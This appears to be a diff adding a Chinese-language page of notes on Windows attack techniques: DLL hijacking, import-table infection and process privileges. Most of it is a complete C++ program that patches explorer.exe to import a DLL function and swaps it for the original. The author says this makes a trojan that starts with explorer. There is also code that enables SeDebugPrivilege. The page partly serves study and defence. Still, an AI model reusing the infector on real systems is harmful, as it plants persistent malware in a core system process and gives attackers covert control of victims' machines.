@@ -1,0 +1,305 @@
+<ul>
+	<li><span style="font-size:22px">DLL劫持原理以及防范方法</span></li>
+</ul>
+
+<ol>
+	<li>
+	<p><span style="font-size:16px">DLL劫持指的是，病毒通过一些手段来劫持或者替换正常的DLL，欺骗正常程序加载预先准备好的恶意DLL。</span></p>
+
+	<p><span style="font-size:16px">如下图，LPK.dll是应用程序运行所需加载的DLL，该系统文件默认在C:\Windows\system32路径下，但由于windows优先搜索当前路径，所以当我们把恶意LPK.dll放在应用程序同一路径下，便会被程序成功加载，从而执行恶意操作。</span></p>
+	</li>
+</ol>
+
+<p>&nbsp;</p>
+
+<p><span style="font-size:22px"><span style="font-size:16px"><img alt="" src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/2446/1639529836000/1fea62c004d24f8297491794c8bccdc8.png" style="height:339px; width:870px" /><img alt="" src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/2446/1639529836000/643f26b85e6944849050486306496519.jpg" style="height:515px; width:1256px" /></span></span></p>
+
+<ol>
+	<li>检测DLL劫持漏洞方法：<a href="https://github.com/sensepost/rattler/releases" target="_blank">https://github.com/sensepost/rattler/releases</a></li>
+</ol>
+
+<ul>
+	<li><span style="font-size:22px">导入表感染以及检测原理</span></li>
+</ul>
+
+<ol>
+	<li><span style="font-size:16px">在explorer.exe中添加了MyDLL.dll的一个导出函数MainFun，如果你想先看看效果可以先把附件下下来，把其中的MyDLL.dll放入环境变量path目录中，例如system32目录就可满足你的需要，然后运行InfectImport.exe,你会看到一个对话框&ldquo;MainFun成功导入explorer.exe&rdquo;，因为我在dll被加载时启动了一个线程，然后输出这句话，是不是有点小题大作了，呵呵，一点也没有小题大作，当把木马程序放入线程函数中就会成为一个不需要远程线程注入的随explorer.exe启动的木马了，是不是有点心动啊，呵呵，不过还是不要干非法勾当为好，技术交流就好。<br />
+	以下为源代码，在vc++6.0中编译通过</span></li>
+	<li>
+	<pre>
+<code class="language-cpp">#include &lt;windows.h&gt;
+#include &lt;IMAGEHLP.H&gt;
+#include &lt;stdio.h&gt;
+#pragma comment(lib,"IMAGEHLP.lib")
+
+//用来计算对齐数据后的大小
+int alig(int size,unsigned int align)
+{
+  if(size%align!=0)
+    return (size/align+1)*align;
+  else
+    return size;
+}
+
+int main()
+{
+  char WinPath[MAX_PATH];
+  char FilePath[MAX_PATH];
+  char NewPath[MAX_PATH];
+  char TemPath[MAX_PATH];
+  char LogPath[MAX_PATH];
+  FILE* fp;
+
+  ::GetWindowsDirectory(WinPath,sizeof(WinPath));  //获取windows所在目录
+  ::memcpy(FilePath,WinPath,sizeof(WinPath));
+  ::memcpy(NewPath,WinPath,sizeof(WinPath));
+  ::memcpy(TemPath,WinPath,sizeof(WinPath));
+  ::memcpy(LogPath,WinPath,sizeof(WinPath));
+
+  ::strcat(FilePath,"\\explorer.exe");             //得到原文件路径
+  ::strcat(NewPath,"\\explorer1.exe");             //修改文件路径
+  ::strcat(TemPath,"\\temp.mainst");               //临时文件路径
+  ::strcat(LogPath,"\\log.dat");             //log文件路径，防止修改修改过的explorer.exe
+
+  //拷贝原始文件，为修改做准备
+  ::CopyFile(FilePath,NewPath,false);
+  ::CopyFile(FilePath,TemPath,false);
+
+  fp=::fopen(LogPath,"r");
+  if(fp != NULL)
+  {
+    MessageBox(NULL,"explorer.exe已被修改过!","提示",MB_OK);
+    return 1;
+  }
+
+  //打开需要修改的文件
+  fp=::fopen(NewPath,"rb+");
+  if(fp==NULL)
+  {
+    ::DeleteFile(NewPath);
+    ::DeleteFile(TemPath);
+    return 0;
+  }
+
+  //往explorer.exe中添加我们准备好的函数
+  LOADED_IMAGE img;
+  HANDLE hFile;
+  PUCHAR lpBaseAddr;
+  PIMAGE_NT_HEADERS lpPEhead;
+  PIMAGE_IMPORT_DESCRIPTOR lpImport,lpNewImport;
+  ULONG ImportSize,NewImportSize;
+  PIMAGE_SECTION_HEADER lpFirstSection;
+  //保存文件对齐值与区块对齐值
+  int SECTION_ALIG;
+  int FILE_ALIG;
+  int fre=0;
+  int i=0;
+  int nOldSectionNo;
+  DWORD NewSecRVA,NewOffset,ThunkRVA,ImportRVA;
+  IMAGE_SECTION_HEADER  NewSection;//要添加的区块
+  IMAGE_NT_HEADERS NewNThead;
+  memset(&amp;NewSection, 0, sizeof(IMAGE_SECTION_HEADER));
+  IMAGE_SECTION_HEADER LastSection;                            //再定义一个区块，来保存原文件最后一个区块的信息
+
+  //对以下使用的函数如果不太熟悉的，可以看看与PE文件相关的函数
+  if(MapAndLoad("temp.mainst",WinPath,&amp;img,false,false))       //获得PE文件相关数据
+  {
+    hFile=img.hFile;
+    lpBaseAddr=img.MappedAddress;
+    lpPEhead=img.FileHeader;
+    lpImport=(PIMAGE_IMPORT_DESCRIPTOR)ImageDirectoryEntryToData
+
+      (lpBaseAddr,FALSE,IMAGE_DIRECTORY_ENTRY_IMPORT,&amp;ImportSize);
+    ImportSize=lpPEhead-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size;
+    nOldSectionNo=lpPEhead-&gt;FileHeader.NumberOfSections;
+    SECTION_ALIG=lpPEhead-&gt;OptionalHeader.SectionAlignment;
+    FILE_ALIG=lpPEhead-&gt;OptionalHeader.FileAlignment;
+    lpFirstSection=img.Sections;
+    NewImportSize=ImportSize+sizeof(IMAGE_IMPORT_DESCRIPTOR);
+    //获取最后一个节
+    memcpy(&amp;LastSection,(PIMAGE_SECTION_HEADER)((DWORD)img.Sections+sizeof(IMAGE_SECTION_HEADER)*(nOldSectionNo-1)),sizeof(IMAGE_SECTION_HEADER));
+    //计算新节的RVA
+    NewSecRVA=LastSection.VirtualAddress+alig(LastSection.Misc.VirtualSize,SECTION_ALIG);
+    //计算新节的文件偏移
+    NewOffset=LastSection.PointerToRawData+alig(LastSection.SizeOfRawData,FILE_ALIG);
+    //写入DLL名
+    fseek(fp,NewOffset,SEEK_SET);
+    fre=sizeof("MyDLL.dll");
+    ::fwrite("MyDLL.dll",sizeof("MyDLL.dll"),1,fp);
+
+    //准备IMAGE_IMPORT_BY_NAME结构
+    IMAGE_IMPORT_BY_NAME ImportFun;
+    ImportFun.Hint=0;
+    memcpy(ImportFun.Name,"MainFun",sizeof("MainFun"));
+
+    DWORD ThunkData[2];
+    ThunkData[0]=NewSecRVA+fre;
+    ThunkData[1]=0;
+
+    //写入IMAGE_IMPORT_BY_NAME结构
+    fseek(fp,NewOffset+fre,SEEK_SET);
+    fre+=sizeof("MainFun")+sizeof(WORD);
+    ::fwrite(&amp;ImportFun,sizeof("MainFun")+sizeof(WORD),1,fp);
+
+    fseek(fp,NewOffset+fre,SEEK_SET);
+    ThunkRVA=NewSecRVA+fre;
+    fre+=sizeof(DWORD)*2;
+    ::fwrite(ThunkData,sizeof(DWORD)*2,1,fp);
+
+    ImportRVA=NewSecRVA+fre;
+    //准备新导入表结构，用来写入新文件
+    lpNewImport=(PIMAGE_IMPORT_DESCRIPTOR)::malloc(NewImportSize);
+    memset(lpNewImport,0,NewImportSize);
+    memcpy(lpNewImport,lpImport,ImportSize);
+
+    //在导入表尾部组织一个新的导入项
+    while(1)
+    {
+      if(lpNewImport[i].OriginalFirstThunk == 0 &amp;&amp; lpNewImport[i].TimeDateStamp == 0 &amp;&amp;
+        lpNewImport[i].ForwarderChain == 0 &amp;&amp; lpNewImport[i].Name == 0 &amp;&amp; lpNewImport[i].FirstThunk == 0)
+      {
+        lpNewImport[i].Name=NewSecRVA;
+        lpNewImport[i].TimeDateStamp=0;
+        lpNewImport[i].ForwarderChain=0;
+        lpNewImport[i].FirstThunk=ThunkRVA;
+        lpNewImport[i].OriginalFirstThunk=ThunkRVA;
+        break;
+      }
+      else i++;
+    }
+
+    fseek(fp,NewOffset+fre,SEEK_SET);
+    fre += NewImportSize;
+    fwrite(lpNewImport,NewImportSize,1,fp);
+    ::free(lpNewImport);
+
+    //文件对齐
+    int num=alig(fre,FILE_ALIG)-fre;
+    for(i=0; i&lt;num; i++)
+      fputc('\0',fp);
+    //添加名为.newsec的新节
+    strcpy((char*)NewSection.Name,".newsec");
+    NewSection.VirtualAddress=NewSecRVA;
+    NewSection.PointerToRawData=NewOffset;
+    NewSection.Misc.VirtualSize=alig(fre,SECTION_ALIG);
+    NewSection.SizeOfRawData=alig(fre,FILE_ALIG);
+    NewSection.Characteristics=0xC0000040;
+
+    fseek(fp,((DWORD)lpFirstSection-(DWORD)lpBaseAddr)+sizeof(IMAGE_SECTION_HEADER)*nOldSectionNo,0);
+
+    //写入新的节表
+    fwrite(&amp;NewSection,sizeof(IMAGE_SECTION_HEADER),1,fp);
+
+    //更新第一块节表属性
+    //此处为我困惑的地方，为什么要把第一个节的属性设为0xE0000020
+    //这个结论我是从比较loadPE修改过的文件中得出的
+    //如果没有此处工作，修改后的文件无法正常运行
+    //希望高人能给我解答下
+    memcpy(&amp;NewSection,lpFirstSection,sizeof(IMAGE_SECTION_HEADER));
+    NewSection.Characteristics=0xE0000020;
+    fseek(fp,(DWORD)lpFirstSection-(DWORD)lpBaseAddr,SEEK_SET);
+    fwrite(&amp;NewSection,sizeof(IMAGE_SECTION_HEADER),1,fp);
+
+    memcpy(&amp;NewNThead,lpPEhead,sizeof(IMAGE_NT_HEADERS));
+    int nNewImageSize=lpPEhead-&gt;OptionalHeader.SizeOfImage+alig(fre,SECTION_ALIG);
+    NewNThead.OptionalHeader.SizeOfImage=nNewImageSize;
+    NewNThead.OptionalHeader.DataDirectory[11].Size=0;
+    NewNThead.OptionalHeader.DataDirectory[11].VirtualAddress=0;
+    NewNThead.OptionalHeader.DataDirectory[12].Size=0;
+    NewNThead.OptionalHeader.DataDirectory[12].VirtualAddress=0;
+    NewNThead.FileHeader.NumberOfSections=nOldSectionNo+1;
+    NewNThead.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress=ImportRVA;
+    NewNThead.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size=NewImportSize;
+    fseek(fp,(DWORD)(lpPEhead)-(DWORD)lpBaseAddr,SEEK_SET);
+
+    //写入更新后的PE头
+    fwrite(&amp;NewNThead,sizeof(IMAGE_NT_HEADERS),1,fp);
+    fclose(fp);
+    UnMapAndLoad(&amp;img);
+  }
+  else
+  {
+    ::DeleteFile(NewPath);
+    ::DeleteFile(TemPath);
+    return 0;
+  }
+
+  //删除临时文件
+  ::DeleteFile(TemPath);
+  //干掉explorer.exe
+  ::rename(FilePath,TemPath);
+  //让我们修改过后的替换掉explorer.exe
+  ::rename(NewPath,FilePath);
+
+  //创建日志文件，以免重复修改
+  fp=::fopen(LogPath,"w");
+  fclose(fp);
+
+  //重新运行explorer
+  ::system("taskkill /F /im explorer.exe");
+  ::system("explorer.exe");
+  return 1;
+}</code></pre>
+
+	<p>&nbsp;</p>
+	</li>
+</ol>
+
+<ul>
+	<li><span style="font-size:22px">进程特权的原理</span></li>
+</ul>
+
+<ol>
+	<li>
+	<p><span style="font-size:16px">Windows操作系统中许多操作都需要有对应的特权，特权也是一种非常隐蔽的留后门的方式。在AD域中，一些特权在<strong>Default Domain Controller Policy</strong>组策略中被授予给一些特殊的组，这些组的成员虽然不是域管，但如果被攻击者控制同样能给AD域带来巨大的风险</span></p>
+
+	<p>&nbsp;</p>
+
+	<p><span style="font-size:16px">因此对防御者来讲，排查用户的特权配置也是重中之重，本文将对一些比较敏感的特权进行介绍，便于防御者更好的理解特权的概念以及进行排查</span></p>
+
+	<h2><span style="font-size:16px">0x01 令牌中的Privilege</span></h2>
+
+	<p><span style="font-size:16px">特权是一个用户或组在本地计算机执行各种系统相关操作（关闭系统、装载设备驱动程序、改变系统时间）的权限，特权与访问权限的区别如下：</span></p>
+	</li>
+	<li><span style="font-size:16px">特权控制账户对系统资源和系统相关任务的访问，而访问权限控制对安全对象（可以具有安全描述符的对象）的访问</span></li>
+	<li><span style="font-size:16px">系统管理员为用户或组指派特权，而系统根据对象的DACL中的ACE授予或拒绝对安全对象的访问，有时拥有特权可以忽略ACL的检查</span></li>
+	<li>
+	<p><span style="font-size:16px">在之前介绍Access Token的文章中我们已经了解过了token的基本结构，其中有一部分表示了该用户及该用户所属组所拥有的特权，如下图所示：</span></p>
+	</li>
+	<li>
+	<p><span style="font-size:16px"><img alt="" src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/2446/1639529836000/f3bd3808d919473e9fe64c2d6b1d3d98.jpg" style="height:575px; width:653px" /></span></p>
+	</li>
+	<li><span style="font-size:16px">通常我们会使用<code>whoami /priv</code>命令查看当前用户所拥有的特权，默认情况下大部分特权是禁用状态，在使用时需要启用</span></li>
+	<li><img alt="" src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/2446/1639529836000/e413bfe581f74abda5fa702a91e6ab7c.jpg" style="height:281px; width:692px" /></li>
+	<li><span style="font-size:16px">通常我们比较通用的启用进程特权的方法是这样的，代码如下：</span></li>
+	<li>
+	<pre>
+<code class="language-cpp">BOOL GetDebugPrivilege()
+{
+    BOOL status = FALSE;
+    HANDLE hToken;
+ 
+    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &amp;hToken))
+    {
+        TOKEN_PRIVILEGES tokenPrivs;
+        tokenPrivs.PrivilegeCount = 1;
+        if (LookupPrivilegeValueW(NULL, SE_DEBUG_NAME, &amp;tokenPrivs.Privileges[0].Luid))
+        {
+            tokenPrivs.Privileges[0].Attributes = TRUE ? SE_PRIVILEGE_ENABLED : 0;
+            if (AdjustTokenPrivileges(hToken, FALSE, &amp;tokenPrivs, sizeof(tokenPrivs), NULL, NULL))
+            {
+                status = TRUE;
+            }
+        }
+        else wprintf(L"[!] LookupPrivilegeValueW error: %u when get debug privilege.\n", GetLastError());
+ 
+        CloseHandle(hToken);
+    }
+    else wprintf(L"[!] OpenProcessToken error: %u when get debug privilege.\n", GetLastError());
+ 
+    return status;
+}</code></pre>
+
+	<p>&nbsp;</p>
+	</li>
+</ol>
